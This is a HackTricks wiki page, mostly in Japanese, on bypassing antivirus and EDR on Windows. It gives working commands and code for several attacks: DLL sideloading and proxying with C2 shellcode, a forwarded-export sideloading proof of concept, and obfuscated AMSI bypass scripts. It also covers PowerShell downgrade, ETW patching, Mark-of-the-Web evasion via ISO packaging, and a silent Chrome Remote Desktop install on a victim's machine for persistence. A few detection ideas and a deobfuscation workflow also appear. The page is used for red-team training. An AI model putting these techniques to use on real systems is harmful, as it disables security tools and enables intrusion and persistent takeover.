# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**このページは** [**@m2rc_p**](https://twitter.com/m2rc_p)**によって書かれました！**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defenderの動作を停止させるツール。
- [no-defender](https://github.com/es3n1n/no-defender): 別のAVを偽装してWindows Defenderの動作を停止させるツール。
- [管理者であれば Defender を無効化する](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

現在、AVはファイルが悪意あるかどうかを判定するために、主に静的検出、動的解析、そしてより高度なEDRでは行動分析といった異なる手法を使用しています。

### **Static detection**

静的検出は、バイナリやスクリプト内の既知の悪意ある文字列やバイト列をフラグ付けしたり、ファイル自体から情報を抽出したり（例: file description、company name、digital signatures、icon、checksumなど）して行われます。つまり、既知の公開ツールを使うと、既に解析されて悪意ありとマークされている可能性が高いため、検出されやすくなります。これを回避する方法はいくつかあります:

- **Encryption**

  バイナリを暗号化すれば、AVがプログラムを検出することは難しくなりますが、メモリ上で復号して実行するためのローダーが必要になります。

- **Obfuscation**

  バイナリやスクリプト内の文字列を変更するだけでAVをすり抜けられることがありますが、何を難読化するかによっては手間がかかる場合があります。

- **Custom tooling**

  独自ツールを開発すれば既知の悪性シグネチャは存在しないため検出されにくくなりますが、これには多大な時間と労力が必要です。

> [!TIP]
> Windows Defenderの静的検出を確認する良い方法は [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) です。ファイルを複数のセグメントに分割し、それぞれを個別にDefenderにスキャンさせることで、バイナリ内のどの文字列やバイトがフラグされているかを正確に知ることができます。

実践的なAV回避についてはこの [YouTubeのプレイリスト](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) を強くおすすめします。

### **Dynamic analysis**

動的解析は、AVがバイナリをサンドボックス内で実行して悪意ある活動（例: ブラウザのパスワードを復号して読む、LSASSのminidumpを取得するなど）を監視する方法です。この部分は扱いがやや難しくなりますが、サンドボックスを回避するためにできることがいくつかあります。

- **Sleep before execution**  
  実装方法によっては、実行前に長時間スリープすることがAVの動的解析を回避する良い手段になることがあります。AVはユーザーのワークフローを妨げないためにファイルをスキャンする時間が非常に短いため、長いスリープは解析を妨げる可能性があります。ただし、多くのAVのサンドボックスは実装によってはスリープをスキップすることができます。

- **Checking machine's resources**  
  通常、サンドボックスは作業用に非常に限られたリソース（例: < 2GB RAM）しか割り当てられていません。CPU温度やファン速度をチェックするなど、クリエイティブな検査を行えば、サンドボックスでは実装されていない項目を突けることがあります。

- **Machine-specific checks**  
  ターゲットが "contoso.local" ドメインに参加しているワークステーションである場合、コンピュータのドメインをチェックして一致しなければプログラムを終了させる、といったことが可能です。

Microsoft DefenderのSandboxのコンピュータ名が HAL9TH であることが判明しているので、マルウェアが起動する前にコンピュータ名をチェックし、名前が HAL9TH と一致する場合はDefenderのサンドボックス内にいると判断してプログラムを終了させる、という手が使えます。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

サンドボックス対策に関しては [@mgeeky](https://twitter.com/mariuszbit) からの非常に良いヒントもあります。

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

前述したように、**public tools** はいずれ **検出される** ようになります。そこで自分に問いかけるべきことは次のような点です:

例えば、LSASSをダンプしたいときに、**本当に mimikatz を使う必要があるのか**？それとも、LSASSをダンプできる、あまり知られていない別のプロジェクトを使うほうが良いのではないか、ということです。

正しい答えはおそらく後者です。mimikatz を例に取ると、プロジェクト自体は素晴らしいものですが、AVやEDRによって最もフラグ付けされているツールの一つであり、AV回避の観点では扱いが非常に面倒です。つまり、達成したい目的に対する代替を探すべきです。

> [!TIP]
> 回避のためにペイロードを変更する場合は、Defenderの自動サンプル送信をオフにすることを忘れないでください。そして真剣に言いますが、長期的に回避を目指すなら **VIRUSTOTAL にアップロードしないでください**。特定のAVで検出されるかどうかを確認したい場合は、VMにそのAVをインストールし、自動サンプル送信をオフにしてから、そこで満足いくまでテストしてください。

## EXEs vs DLLs

可能な限り、回避のためには常に **DLLs を使うことを優先**してください。私の経験では、DLLファイルは通常 **検出されにくく**、解析されにくいことが多く、ペイロードがDLLとして実行できる方法を持っている場合は、検出を回避するための非常に単純で効果的なトリックになります。

この画像のように、HavocのDLLペイロードはantiscan.meで検出率が4/26だったのに対し、EXEペイロードは7/26の検出率でした。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

ここからは、DLLファイルを使ってさらにステルス性を高めるためのいくつかのトリックを紹介します。

## DLL Sideloading & Proxying

**DLL Sideloading** は、ローダーが使用するDLL検索順序を悪用し、被害者アプリケーションと悪意あるペイロードを同じ場所に配置することで成立します。

脆弱なDLL Sideloadingの可能性があるプログラムは [Siofra](https://github.com/Cybereason/siofra) と以下のpowershellスクリプトを使って確認できます:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
このコマンドは "C:\Program Files\\" 内で DLL hijacking に脆弱なプログラムの一覧と、それらがロードしようとする DLL ファイルを出力します。

私は、**explore DLL Hijackable/Sideloadable programs yourself** を強くお勧めします。適切に行えばこの手法はかなりステルス性が高いですが、公開されている既知の DLL Sideloadable プログラムを使用すると簡単に見つかる可能性があります。

単にプログラムがロードすることを期待している名前の悪意ある DLL を配置しただけでは、プログラムが当該 DLL 内の特定の関数を期待しているため、必ずしもペイロードは実行されません。この問題を解決するために、別の手法である **DLL Proxying/Forwarding** を使用します。

**DLL Proxying** は、プログラムが行う呼び出しをプロキシ（および悪意ある）DLL から元の DLL に転送することで、プログラムの機能を保持しつつペイロードの実行を扱えるようにします。

私は [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) プロジェクトを [@flangvik](https://twitter.com/Flangvik/) から使用します。

以下が私が行った手順です：
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最後のコマンドは、次の2つのファイルを生成します: DLLのソースコードテンプレートと、名前が変更された元のDLL。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> I **highly recommend** you watch [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) about DLL Sideloading and also [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) to learn more about what we've discussed more in-depth.

### Forwarded Exports の悪用 (ForwardSideLoading)

Windows PE モジュールは、実際には "forwarders" である関数をエクスポートすることができます: コードを指す代わりに、エクスポートエントリには `TargetDll.TargetFunc` の形式の ASCII 文字列が含まれます。呼び出し側がそのエクスポートを解決すると、Windows ローダーは次のことを行います:

- まだロードされていない場合 `TargetDll` をロードする
- そこから `TargetFunc` を解決する

理解しておくべき主な挙動:
- `TargetDll` が KnownDLL の場合、保護された KnownDLLs 名前空間（例: ntdll, kernelbase, ole32）から供給されます。
- `TargetDll` が KnownDLL でない場合は、通常の DLL 検索順が使用され、forward 解決を行っているモジュールのディレクトリも含まれます。

これにより間接的な sideloading プリミティブが可能になります: 署名された DLL の中で、エクスポートが non-KnownDLL モジュール名に forward されているものを見つけ、その署名 DLL を、forward のターゲットモジュールと正確に同じ名前の attacker-controlled DLL と同じディレクトリに配置します。forwarded export が呼び出されると、ローダーは forward を解決し、同じディレクトリからあなたの DLL をロードして DllMain を実行します。

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` は KnownDLL ではないため、通常の検索順で解決されます。

PoC (copy-paste):
1) 署名されたシステム DLL を書き込み可能なフォルダにコピーする
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 同じフォルダに悪意のある `NCRYPTPROV.dll` を置く。最小限の `DllMain` で code execution を得られる; DllMain をトリガーするために forwarded function を実装する必要はない。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 署名済みのLOLBinで転送をトリガーする:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
観察された挙動:
- rundll32（署名済み）が side-by-side の `keyiso.dll`（署名済み）をロードする
- `KeyIsoSetAuditingInterface` を解決する際、ローダーはフォワード先の `NCRYPTPROV.SetAuditingInterface` をたどる
- ローダーはその後 `C:\test` から `NCRYPTPROV.dll` をロードし、その `DllMain` を実行する
- `SetAuditingInterface` が実装されていない場合、`DllMain` が既に実行された後になって初めて "missing API" エラーが発生する

Hunting tips:
- ターゲットモジュールが KnownDLL でない forwarded exports に注目する。KnownDLLs は `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` に列挙されている。
- forwarded exports を列挙するには、例えば以下のようなツールを使える:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Windows 11 forwarder のインベントリを確認して候補を探す: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- LOLBins (例: rundll32.exe) が非システムパスから署名済みDLLを読み込み、続いて同じベース名の非KnownDLLsをそのディレクトリから読み込む動作を監視する
- 次のようなプロセス／モジュールのチェーンをアラートする: `rundll32.exe` → 非システムの `keyiso.dll` → `NCRYPTPROV.dll` がユーザ書き込み可能なパス下にある場合
- コード整合性ポリシー（WDAC/AppLocker）を適用し、アプリケーションディレクトリでの書き込み＋実行を拒否する

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze を使用して shellcode をステルスに読み込み、実行できます。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion はいたちごっこに過ぎません。今日有効な方法が明日には検出される可能性があるため、単一のツールに頼らないでください。可能であれば複数の回避手法を組み合わせてください。

## AMSI (Anti-Malware Scan Interface)

AMSI は "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" を防ぐために作られました。初期の頃、AV はディスク上のファイルしかスキャンできなかったため、ペイロードをメモリ上で直接実行できれば AV はそれを阻止できませんでした（可視性が不足していたため）。

AMSI の機能は Windows の以下のコンポーネントに統合されています。

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

これはスクリプトの内容を暗号化されておらず、難読化もされていない形で公開することで、アンチウイルスがスクリプトの挙動を検査できるようにします。

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` を実行すると、Windows Defender に以下のアラートが出ます。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:` を先頭に付け、その後スクリプトが実行された実行ファイルのパス（この場合は powershell.exe）を表示している点に注意してください。

ファイルをディスクに落としていなくても、AMSI のためにメモリ内で検出されてしまいました。

さらに、**.NET 4.8** 以降では C# コードも AMSI を経由して実行されます。これは `Assembly.Load(byte[])` によるインメモリ実行にも影響します。そのため、AMSI を回避したい場合は、インメモリ実行のために .NET のより古いバージョン（例: 4.7.2 以下）を使うことが推奨されます。

AMSI を回避する方法はいくつかあります:

- **Obfuscation**

  AMSI は主に静的検出で動作するため、読み込もうとするスクリプトを変更することで検出を回避できる場合があります。

  ただし、AMSI には多層にわたる難読化を解除する能力があるため、難読化のやり方によっては逆効果になることもあります。したがって回避は単純ではありません。とはいえ、変数名を少し変えるだけで通ることもあるので、どれだけフラグが立っているかによります。

- **AMSI Bypass**

  AMSI は DLL を powershell（および cscript.exe、wscript.exe 等）のプロセスにロードして実装されているため、権限のないユーザーであっても簡単に改ざんできる場合があります。この実装上の欠陥により、研究者達はいくつかの AMSI スキャン回避手法を発見しています。

**Forcing an Error**

AMSI の初期化を失敗させる（amsiInitFailed）と、当該プロセスに対してスキャンが開始されなくなります。これは元々 [Matt Graeber](https://twitter.com/mattifestation) によって公開され、Microsoft はそれの広範な利用を防ぐためのシグネチャを開発しました。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
現在の powershell プロセスで AMSI を動作不能にするのに必要だったのは、たった1行の powershell コードだけだった。この行はもちろん AMSI 自身により検出されるため、この手法を使うには修正が必要だ。

以下は私がこの [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) から取った修正済みの AMSI bypass だ。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

この手法は最初に[@RastaMouse](https://twitter.com/_RastaMouse/)によって発見されました。ユーザー入力をスキャンする役割を持つ "AmsiScanBuffer" 関数のアドレスを amsi.dll 内で特定し、E_INVALIDARG を返すように命令を書き換えます。こうすることで実際のスキャン結果は 0 を返し、クリーンと解釈されます。

> [!TIP]
> 詳しい説明は [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) をご覧ください。

AMSI を PowerShell で回避するための他の手法も多数あります。詳細は [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) と [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) を参照してください。

このツール [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) は AMSI をバイパスするスクリプトを生成します。

**Remove the detected signature**

現在のプロセスのメモリから検出された AMSI シグネチャを削除するために、**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** や **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** といったツールを使用できます。これらのツールは現在のプロセスのメモリをスキャンして AMSI シグネチャを検出し、それを NOP 命令で上書きして実質的にメモリから除去します。

**AV/EDR products that uses AMSI**

AMSI を使用する AV/EDR 製品の一覧は **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** で確認できます。

**Use Powershell version 2**
If you use PowerShell version 2, AMSI will not be loaded, so you can run your scripts without being scanned by AMSI. You can do this:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging は、システム上で実行されたすべての PowerShell コマンドを記録できる機能です。監査やトラブルシューティングには有用ですが、検知を回避したい攻撃者にとっては**問題になることがあります**。

PowerShell logging をバイパスするために、次の手法が使えます:

- **Disable PowerShell Transcription and Module Logging**: この目的には [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) のようなツールを使えます。
- **Use Powershell version 2**: PowerShell version 2 を使うと AMSI は読み込まれないため、スクリプトを AMSI にスキャンされずに実行できます。実行方法: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) を使って防御のない powershell をスポーンします（これは `powerpick` が Cobal Strike から使っている方法です）。


## Obfuscation

> [!TIP]
> いくつかのオブフスケーション技術はデータを暗号化することに依存しており、これによりバイナリのエントロピーが上がり、AVs や EDRs に検知されやすくなります。これには注意し、機密性の高い特定のセクションにのみ暗号化を適用するなどの対策を検討してください。

### Deobfuscating ConfuserEx-Protected .NET Binaries

ConfuserEx 2（または商用フォーク）を使ったマルウェアを解析する際、ディコンパイラやサンドボックスを妨げる複数の保護レイヤーに直面することがよくあります。以下のワークフローは、ほぼ元の IL を確実に復元し、その後 dnSpy や ILSpy のようなツールで C# にデコンパイルできるようにします。

1.  Anti-tampering の除去 – ConfuserEx は各 *method body* を暗号化し、*module* の static コンストラクタ（`<Module>.cctor`）内で復号します。これにより PE チェックサムも修正されるため、任意の変更はバイナリをクラッシュさせます。**AntiTamperKiller** を使って暗号化されたメタデータテーブルを特定し、XOR キーを復元してクリーンなアセンブリを書き直します:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
出力には 6 つの anti-tamper パラメータ（`key0-key3`, `nameHash`, `internKey`）が含まれ、独自のアンパッカーを作る際に役立ちます。

2.  シンボル／制御フローの復元 – *clean* ファイルを **de4dot-cex**（ConfuserEx 対応フォーク）に渡します。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 のプロファイルを選択  
• de4dot は control-flow flattening を元に戻し、元の namespace、class、変数名を復元し、定数文字列を復号します。

3.  Proxy-call の除去 – ConfuserEx はデコンパイルをさらに難しくするため、直接呼び出しを軽量ラッパー（いわゆる *proxy calls*）に置き換えます。これを **ProxyCall-Remover** で除去します:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
この手順後は、不透明なラッパー関数（`Class8.smethod_10` など）の代わりに、`Convert.FromBase64String` や `AES.Create()` といった通常の .NET API を確認できるはずです。

4.  手動でのクリーンアップ – 生成されたバイナリを dnSpy で実行し、大きな Base64 ブロブや `RijndaelManaged`/`TripleDESCryptoServiceProvider` の使用箇所を検索して、*実際の*ペイロードを特定します。多くの場合、マルウェアは `<Module>.byte_0` 内で初期化された TLV エンコードのバイト配列として格納しています。

上記のチェーンは、悪意あるサンプルを実行することなく実行フローを復元します — オフラインの作業用ワークステーションで解析する際に有用です。

> 🛈  ConfuserEx は `ConfusedByAttribute` というカスタム属性を生成します。これはサンプルを自動的にトリアージする IOC として利用できます。

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、LLVM コンパイルスイートのオープンソースフォークを提供し、code obfuscation と改ざん防止によってソフトウェアのセキュリティを向上させることです。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator は `C++11/14` を使用して、外部ツールやコンパイラの変更なしにコンパイル時に obfuscated code を生成する方法を示します。
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming フレームワークによって生成される obfuscated operations の層を追加し、アプリケーションを解析しようとする者の作業を少しだけ困難にします。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz は x64 バイナリ obfuscator で、.exe, .dll, .sys を含む各種 PE ファイルを obfuscate できます。
- [**metame**](https://github.com/a0rtega/metame): Metame は任意の実行可能ファイル向けのシンプルな metamorphic code エンジンです。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator は ROP (return-oriented programming) を用いる LLVM 対応言語向けの細粒度 code obfuscation フレームワークです。ROPfuscator は通常の命令を ROP チェーンに変換してアセンブリレベルでプログラムを obfuscate し、通常の制御フローに関する我々の直感を阻害します。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt は Nim で書かれた .NET PE Crypter です
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor は既存の EXE/DLL を shellcode に変換してロードできます

## SmartScreen & MoTW

インターネットから実行ファイルをダウンロードして実行した際に、このような画面を見たことがあるかもしれません。

Microsoft Defender SmartScreen は、エンドユーザが潜在的に悪意のあるアプリケーションを実行するのを防ぐためのセキュリティ機構です。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen は主にレピュテーションベースの方式で動作します。つまり、あまりダウンロードされていないアプリケーションが SmartScreen をトリガーし、エンドユーザに警告してファイルの実行を防ぎます（ただしファイルは More Info -> Run anyway をクリックすることで実行可能です）。

**MoTW** (Mark of The Web) は Zone.Identifier という名前の NTFS Alternate Data Stream で、インターネットからファイルをダウンロードすると自動的に作成され、ダウンロード元の URL を含みます。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>インターネットからダウンロードしたファイルの Zone.Identifier ADS を確認しています。</p></figcaption></figure>

> [!TIP]
> 重要なのは、**信頼された** 署名証明書で署名された実行ファイルは **SmartScreen をトリガーしません**。

ペイロードが Mark of The Web を付与されるのを防ぐ非常に効果的な方法は、ISO のようなコンテナにパッケージングすることです。これは Mark-of-the-Web (MOTW) が非 NTFS ボリュームには適用できないためです。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) はペイロードを出力コンテナにパッケージして Mark-of-the-Web を回避するツールです。

使用例:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) は、アプリケーションやシステムコンポーネントがイベントをログするための強力な Windows のロギング機構です。しかし、これがセキュリティ製品によって悪意ある活動の監視や検出に利用されることもあります。

AMSI を無効化（バイパス）するのと同様に、ユーザー空間プロセスの **`EtwEventWrite`** 関数を即座にリターンさせてイベントをログしないようにすることも可能です。これは関数をメモリ上でパッチして即座に戻るようにすることで行われ、結果としてそのプロセスの ETW ロギングを無効化します。

詳細は **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** を参照してください。


## C# Assembly Reflection

C# バイナリをメモリにロードして実行する手法は以前から知られており、AV に検出されずに post-exploitation ツールを実行する非常に有効な方法です。

ペイロードがディスクに書き込まれず直接メモリにロードされるため、プロセス全体で AMSI をパッチすることだけを考慮すれば済みます。

ほとんどの C2 フレームワーク（sliver、Covenant、metasploit、CobaltStrike、Havoc など）は既に C# アセンブリをメモリ上で直接実行する機能を提供していますが、実行方法にはいくつかのやり方があります：

- **Fork\&Run**

新しい犠牲プロセスを **spawn** して、その新プロセスに post-exploitation の悪意あるコードを注入し、実行が完了したら新しいプロセスを終了する方法です。利点と欠点があります。Fork and run の利点は実行が Beacon インプラントプロセスの **外部** で行われる点で、もし何かが失敗したり検出されてもインプラントが生き残る **可能性が格段に高く** なります。一方で、**Behavioural Detections** に引っかかる **可能性が高く** なります。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

自身のプロセスに post-exploitation の悪意あるコードを注入する方法です。新しいプロセスを作成して AV にスキャンされるのを避けられますが、ペイロード実行中に何か問題が起きた場合に Beacon を失う（クラッシュする）**可能性が高く** なります。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly ローディングについて詳しく知りたい場合はこの記事 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) とその InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) を参照してください。

PowerShell から C# Assemblies をロードすることも可能です。 [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) と [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) をチェックしてください。

## Using Other Programming Languages

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) で提案されているように、攻撃者が管理する SMB 共有上に配置したインタプリタ環境に被害マシンからアクセスを許可することで、他の言語を使って悪意あるコードを実行することが可能です。

SMB 共有上のインタプリタバイナリと環境へのアクセスを許可することで、被害マシンのメモリ内でこれらの言語の任意コードを実行できます。

リポジトリではこう述べられています：Defender はスクリプトをスキャンし続けますが、Go、Java、PHP などを利用することで **静的シグネチャを回避する柔軟性が高まる** と。ランダムで難読化していないリバースシェルスクリプトをこれらの言語でテストしたところ成功した例があります。

## TokenStomping

Token stomping は攻撃者がアクセス トークンや EDR や AV のようなセキュリティ製品のトークンを操作し、その権限を低くすることでプロセスを終了させずに悪意ある活動のチェックを行えないようにする手法です。

これを防ぐために、Windows はセキュリティプロセスのトークンに外部プロセスがハンドルを取得することを **防ぐ** べきでしょう。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

[**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) に記載されているように、被害者の PC に Chrome Remote Desktop を展開して takeover および持続化に利用するのは簡単です：
1. https://remotedesktop.google.com/ からダウンロードし、"Set up via SSH" をクリックし、Windows 用の MSI ファイルをダウンロードします。
2. 被害者側でサイレントインストールを実行します（管理者権限が必要）： `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop のページに戻り、Next をクリックします。ウィザードが認可を求めるので、Authorize ボタンをクリックして続行します。
4. 与えられたパラメータを少し調整して実行します： `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（GUI を使わずに pin を設定できる点に注意）

## Advanced Evasion

Evasion は非常に複雑なトピックで、1 台のシステム内でも多くの異なるテレメトリソースを考慮する必要があるため、成熟した環境で完全に検出を免れるのはほぼ不可能です。

対峙する環境ごとに強みと弱みが存在します。

より高度な Evasion 技術の足がかりを得るために、[@ATTL4S](https://twitter.com/DaniLJ94) のこのトークを見ることを強くお勧めします。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

これはまた、[@mariuszbit](https://twitter.com/mariuszbit) による Evasion in Depth の優れたトークです。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) を使うと、バイナリのパーツを順に取り除きながら Defender がどの部分を悪意あるものと判定しているかを突き止め、分割して教えてくれます。\
同様のことを行う別のツールとしては、ウェブサービスを公開している [**avred**](https://github.com/dobin/avred)（https://avred.r00ted.ch/）があります。

